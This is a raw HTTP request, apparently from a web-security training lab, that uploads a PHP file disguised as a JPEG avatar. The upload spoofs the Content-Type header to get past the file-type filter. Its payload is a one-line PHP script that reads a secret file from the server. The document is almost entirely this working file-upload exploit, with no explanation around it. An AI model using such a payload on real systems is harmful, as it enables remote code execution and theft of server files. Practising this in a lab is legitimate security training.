# FILE-UPLOADING-ATTACKPOST /my-account/avatar HTTP/2
Host: 0a1400ae04a1800c803f17980094001f.web-security-academy.net
Cookie: session=HiGzee5sulyg6QhWzcVRJAX6iK6xFs5o
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------80894475424125541241845357712
Content-Length: 535
Origin: https://0a1400ae04a1800c803f17980094001f.web-security-academy.net
Referer: https://0a1400ae04a1800c803f17980094001f.web-security-academy.net/my-account?id=wiener
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

-----------------------------80894475424125541241845357712
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
**Content-Type: image/jpeg**

<?php echo file_get_contents('/home/carlos/secret'); ?>

-----------------------------80894475424125541241845357712
Content-Disposition: form-data; name="user"

wiener
-----------------------------80894475424125541241845357712
Content-Disposition: form-data; name="csrf"

0nsM4rPHuWpDkojE3zsJQu3Q3AHMMRYt
-----------------------------80894475424125541241845357712--
